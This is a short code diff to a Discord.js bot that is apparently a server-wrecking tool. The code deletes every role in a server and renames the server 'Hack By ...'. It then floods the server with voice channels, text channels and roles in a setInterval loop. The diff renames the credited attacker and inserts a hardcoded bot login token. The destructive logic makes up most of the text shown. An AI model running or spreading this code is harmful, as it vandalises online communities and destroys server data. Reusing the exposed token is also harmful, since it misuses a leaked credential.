@@ -15,15 +15,15 @@ client.on("message", message => {
       message.guild.roles.forEach(r => {
         r.delete();
       });
-      message.guild.setName("Hack By Dark Man");
+      message.guild.setName("Hack By XaRaBoSs");
       setInterval(function() {
-        message.guild.createChannel("By Dark Man", "voice");
-        message.guild.createChannel("By Dark Man", "text");
-        message.guild.createRole({ name: "By Dark Man" });
+        message.guild.createChannel("By XaRaBoSs", "voice");
+        message.guild.createChannel("By XaRaBoSs", "text");
+        message.guild.createRole({ name: "By XaRaBoSs" });
       });
     }
   }
 });
 
-client.login("");
+client.login("ODMxNTY4NjMwMzg2OTE3NDQ2.YHXIow.wr8TgOWnknBuZTGiYDR5U-Ok-Yg");
 ///////By Dark Man\\\\\\\
